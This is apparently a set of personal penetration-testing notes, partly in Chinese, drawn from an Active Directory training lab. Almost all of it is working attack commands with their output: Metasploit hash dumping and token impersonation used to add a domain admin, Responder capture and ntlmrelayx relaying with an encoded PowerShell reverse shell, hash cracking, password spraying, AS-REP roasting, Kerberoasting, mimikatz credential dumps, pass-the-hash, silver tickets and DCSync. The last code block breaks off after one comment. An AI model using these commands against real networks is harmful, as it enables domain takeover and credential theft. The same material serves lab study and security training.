# Scp

```bash
local to remote
scp local_file remote_username@remote_ip:remote_folder 
或者 
scp local_file remote_username@remote_ip:remote_file 
scp local_file remote_ip:remote_folder 
scp local_file remote_ip:remote_file

remote to local
scp root@xxx.xxx.xxx.xxx:/home/root/others/music /home/space/music/1.mp3 
scp -r xxx.xxx.xxx.xxx:/home/root/others/ /home/space/music/
```

# Browser Addons

```bash
- Chrome:

Recx Security Analyser
Wappalyzer

- Firefox/Iceweasel:

Web Developer
Tamper Data
FoxyProxy Standard
User Agent Switcher
PassiveRecon
Wappalyzer
Firebug
HackBar
```

# Domain Admin Exploitation

```bash
[>] List the domain administrators:
From Shell - net group "Domain Admins" /domain

[>] Dump the hashes (Metasploit)
msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE

[>] Find the admins (Metasploit)
spool /tmp/enumdomainusers.txt
msf > use auxiliary/scanner/smb/smb_enumusers_domain
msf > set smbuser Administrator
msf > set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf > set rhosts 10.10.10.0/24
msf > set threads 8
msf > run

msf> spool off

[>] Compromise Admin's box
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token MYDOM\\adaministrator
meterpreter > getuid
meterpreter > shell

C:\> whoami
mydom\adaministrator
C:\> net user hacker /add /domain
C:\> net group "Domain Admins" hacker /add /domain
```

# Password Attack

## Net-NTLMv2
```powershell
kali@kali:~$ nc 192.168.50.211 4444
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
files01\paul

C:\Windows\system32> net user paul
net user paul
User name                    paul
Full Name                    paul power
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/3/2022 10:05:27 AM
Password expires             Never
Password changeable          6/3/2022 10:05:27 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/3/2022 10:29:19 AM

Logon hours allowed          All

Local Group Memberships      *Remote Desktop Users *Users -> 远程用户组         
Global Group memberships     *None                 
The command completed successfully.


kali@kali:~$ ip a
...
3: tap0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000
    link/ether 42:11:48:1b:55:18 brd ff:ff:ff:ff:ff:ff
    inet 192.168.119.2/24 scope global tap0
       valid_lft forever preferred_lft forever
    inet6 fe80::4011:48ff:fe1b:5518/64 scope link 
       valid_lft forever preferred_lft forever

kali@kali:~$ sudo responder -I tap0 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
...
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
...
[+] Listening for events... 

C:\Windows\system32>dir \\192.168.119.2\test

Access is denied.

[+] Listening for events... 
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000 


hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.5) starting
...

PAUL::FILES01:1f9d4c51f6e74653:795f138ec69c274d0fd53bb32908a72b:010100000000000000b050cd1777d801b7585df5719acfba0000000002000800360057004d00520001001e00570049004e002d00340044004e004800550058004300340054004900430004003400570049004e002d00340044004e00480055005800430034005400490043002e00360057004d0052002e004c004f00430041004c0003001400360057004d0052002e004c004f00430041004c0005001400360057004d0052002e004c004f00430041004c000700080000b050cd1777d801060004000200000008003000300000000000000000000000002000008ba7af42bfd51d70090007951b57cb2f5546f7b599bc577ccd13187cfc5ef4790a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e003100310038002e0032000000000000000000:123Password123
```

## Relaying Net-NTLMv2
```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..." 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections

kali@kali:~$  nc 192.168.50.211 5555                                       
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
files01\files02admin

C:\Windows\system32>dir \\192.168.119.2\test
[*] SMBD-Thread-4: Received connection from 192.168.50.211, attacking target smb://192.168.50.212
[*] Authenticating against smb://192.168.50.212 as FILES01/FILES02ADMIN SUCCEED
[*] SMBD-Thread-6: Connection from 192.168.50.211 controlled, but there are no more targets left!
...
[*] Executed specified command on host: 192.168.50.212
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.212] 49674
whoami
nt authority\system
PS C:\Windows\system32> hostname
FILES02
PS C:\Windows\system32> ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::7992:61cd:9a49:9046%4
   IPv4 Address. . . . . . . . . . . : 192.168.50.212
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254

```

## SSH
```bash
kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash

kali@kali:~/passwordattacks$ cat ssh.hash
id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682...

kali@kali:~/passwordattacks$ hashcat -h | grep -i "ssh" 
...
  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                 | Enterprise Application Software (EAS)
  22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)               | Private Key
  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)               | Private Key
  22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)           | Private Key
  22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)               | Private Key
  22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)               | Private Key
  
kali@kali:~/passwordattacks$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
hashcat (v6.2.5) starting
...

Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception
No hashes loaded.
...
# 不幸的是，我们收到一条错误消息，表明我们的哈希值导致了“令牌长度异常”。当我们使用搜索引擎对此进行研究时，一些讨论表明现代私钥及其相应的密码短语是使用 aes-256-ctr 密码创建的，Hashcat 的模式 22921 不支持这种密码。
#这加强了使用多种工具的好处，因为John the Ripper (JtR) 可以处理这种密码。

kali@kali:~/passwordattacks$ cat ssh.rule
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

kali@kali:~/passwordattacks$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
kali@kali:~/passwordattacks$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Umbrella137!     (?)     
1g 0:00:00:00 DONE (2022-05-30 11:19) 1.785g/s 32.14p/s 32.14c/s 32.14C/s Window137!..Umbrella137#
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
  
```



## 密码喷射
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")


#我们可以使用此技术创建一个 PowerShell 脚本，该脚本枚举所有用户并根据 Lockout threshold和Lockout observation window执行身份验证。
# 此密码喷射策略已在 CLIENT75 上的 PowerShell 脚本C:\Tools\ Spray-Passwords.ps1中实施。

# 如果用户帐户的密码正确，对象创建就会成功，如下所示。
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com

PS C:\Users\jeff> cd C:\Tools

PS C:\Tools> powershell -ep bypass
...

PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
Guessed password for user: 'pete' = 'Nexus123!'
Guessed password for user: 'jen' = 'Nexus123!'
Users guessed are:
 'pete' with password: 'Nexus123!'
 'jen' with password: 'Nexus123!'
 
 
 kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
 
 kali@kali:~$ crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com 
 
 PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

 ## AS_REP
 ```bash
 kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
 
 kali@kali:~$ hashcat --help | grep -i "Kerberos"
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
 
 kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...

$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b03ec750cf33a2c37abde02f28b7ab363ffa1d18c9dd0262e43ab6a5447db44f71256120f94c24b17b1df465beed362fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd8658b144186042faaa676931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc22:Flowers1
...

PS C:\Tools> .\Rubeus.exe asreproast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: AS-REP roasting

[*] Target Domain          : corp.com

[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : dave
[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.50.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A

kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
$krb5asrep$dave@corp.com:ae43ca9011cc7e7b9e7f7e7279dd7f2e$7d4c59410de2984edf35053b7954e6dc9a0d16cb5be8e9dcacca88c3c13c4031abd71da16f476eb972506b4989e9aba2899c042e66792f33b119fab1837d94eb654883c6c3f2db6d4a8d44a8d9531c2661bda4dd231fa985d7003e91f804ecf5ffc0743333959470341032b146ab1dc9bd6b5e3f1c41bb02436d7181727d0c6444d250e255b7261370bc8d4d418c242abae9a83c8908387a12d91b40b39848222f72c61ded5349d984ffc6d2a06a3a5bc19ddff8a17ef5a22162baade9ca8e48dd2e87bb7a7ae0dbfe225d1e4a778408b4933a254c30460e4190c02588fbaded757aa87a:Flowers1
...
 ```

## Kerberoasting
```powershell
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Kerberoasting
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
[*] Target Domain          : corp.com
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1
[*] SamAccountName         : iis_service
[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
[*] ServicePrincipalName   : HTTP/web04.corp.com:80
[*] PwdLastSet             : 9/7/2022 5:38:43 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Tools\hashes.kerberoast


kali@kali:~$ cat hashes.kerberoast
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...
...

kali@kali:~$ hashcat --help | grep -i "Kerberos"         
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
  
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...

$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940ad9dcf5dd5cd8e91a86d4ba0396db$f57066a4f4f8ff5d70df39b0c98ed7948a5db08d689b92446e600b49fd502dea39a8ed3b0b766e5cd40410464263557bc0e4025bfb92d89ba5c12c26c72232905dec4d060d3c8988945419ab4a7e7adec407d22bf6871d
...
d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce63694e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1


kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete                                      
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  -----------  --------  --------------------------  ---------  ----------
HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  <never>               


[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec...


kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...

$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec
...
a96a7e6e29aa173b401935f8f3a476cdbcca8f132e6cc8349dcc88fcd26854e334a2856c009bc76e4e24372c4db4d7f41a8be56e1b6a912c44dd259052299bac30de6a8d64f179caaa2b7ee87d5612cd5a4bb9f050ba565aa97941ccfd634b:Strawberry1
...

```



## Mimikatz

### NTLM
```cmd
lsadump::sam
    Domain : MARKETINGWK01
    SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
    Local SID : S-1-5-21-4264639230-2296035194-3358247000
     
    RID  : 000003e9 (1001)
    User : offsec
      Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
     
    RID  : 000003ea (1002)
    User : nelly
      Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
      
      
cat nelly.hash     
3ae8e5f0ffabb3a627672e1600f1ba10

kali@kali:~/passwordattacks$ hashcat --help | grep -i "ntlm"   
                                                                            
   5500 | NetNTLMv1 / NetNTLMv1+ESS                           | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                      | Network Protocol
   5600 | NetNTLMv2                                           | Network Protocol
  27100 | NetNTLMv2 (NT)                                      | Network Protocol
   1000 | NTLM                                                | Operating System

kali@kali:~/passwordattacks$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### PTH
```cmd
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
...

mimikatz # lsadump::sam
...
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
...

1. kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
smb: \> dir
  .                                   D        0  Thu Jun  2 16:55:37 2022
  ..                                DHS        0  Thu Jun  2 16:55:35 2022
  secrets.txt                         A        4  Thu Jun  2 11:34:47 2022

                4554239 blocks of size 4096. 771633 blocks available
 
smb: \> get secrets.txt
getting file \secrets.txt of size 4 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

2. 
kali@kali:~$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

3. 
kali@kali:~$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

```
### Cached AD Credentials
```cmd
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 4876838 (00000000:004a6a26)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 12:32:11 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105
        msv :
         [00000003] Primary
         * Username : jeff
         * Domain   : CORP
         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea
         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f
         * DPAPI    : 3a847021d5488a148c265e6d27a420e6
        tspkg :
        wdigest :
         * Username : jeff
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
...
Authentication Id : 0 ; 122474 (00000000:0001de6a)
Session           : Service from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 1:32:23 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
...

PS C:\Users\jeff> dir \\web04.corp.com\backup


    Directory: \\web04.corp.com\backup


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/13/2022   2:52 AM              0 backup_schemata.txt


mimikatz # sekurlsa::tickets

Authentication Id : 0 ; 656588 (00000000:000a04cc)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/13/2022 2:43:31 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105

         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:59:47 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             38dba17553c8a894c79042fe7265a00e36e7370b99505b8da326ff9b12aaf9c7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
         [00000001]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             c44762f3b4755f351269f6f98a35c06115a53692df268dead22bc9f06b6b0ce5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             bf25fbd514710a98abaccdf026b5ad14730dd2a170bca9ded7db3fd3b853892a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
...
```



### 银票

```powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1147751 (00000000:00118367)
Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 4:52:14 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
...

---------------------

PS C:\Users\jeff> whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105


---------------------

mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
User      : jeffadmin
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
Service   : http
Target    : web04.corp.com
Lifetime  : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session

mimikatz # exit
Bye!

---------------------
PS C:\Tools> klist

Current LogonId is 0:0xa04cc

Cached Tickets: (1)

#0>     Client: jeffadmin @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/14/2022 4:37:32 (local)
        End Time:   9/11/2032 4:37:32 (local)
        Renew Time: 9/11/2032 4:37:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

PS C:\Tools> iwr -UseDefaultCredentials http://web04

StatusCode        : 200
StatusDescription : OK
Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
                    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
                    <html xmlns="http://www.w3.org/1999/xhtml">
                    <head>
                    <meta http-equiv="Content-Type" cont...
RawContent        : HTTP/1.1 200 OK
                    Persistent-Auth: true
                    Accept-Ranges: bytes
                    Content-Length: 703
                    Content-Type: text/html
                    Date: Wed, 14 Sep 2022 11:37:39 GMT
                    ETag: "b752f823fc8d81:0"
                    Last-Modified: Wed, 14 Sep 20...
Forms             :
Headers           : {[Persistent-Auth, true], [Accept-Ranges, bytes], [Content-Length, 703], [Content-Type,
                    text/html]...}
Images            : {}
InputFields       : {}
Links             : {@{outerHTML=<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img
                    src="iisstart.png" alt="IIS" width="960" height="600" /></a>; tagName=A;
                    href=http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409}}
ParsedHtml        :
RawContentLength  : 703

```
### Domain Controller Synchronization
```powershell
PS C:\Users\jeffadmin> cd C:\Tools\

PS C:\Tools> .\mimikatz.exe
...

mimikatz # lsadump::dcsync /user:corp\dave
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\dave' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : dave

** SAM ACCOUNT **

SAM Username         : dave
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
Account expiration   :
Password last change : 9/7/2022 9:54:57 AM
Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
Object Relative ID   : 1103

Credentials:
    Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d
...

-------------------------

kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
08d7a47a6f9f66b97b1bae4178747494:Flowers1              
...

------------------------
mimikatz # lsadump::dcsync /user:corp\Administrator
...
Credentials:
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
...

------------------------
kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

```

```powershell
# 读取密码明文
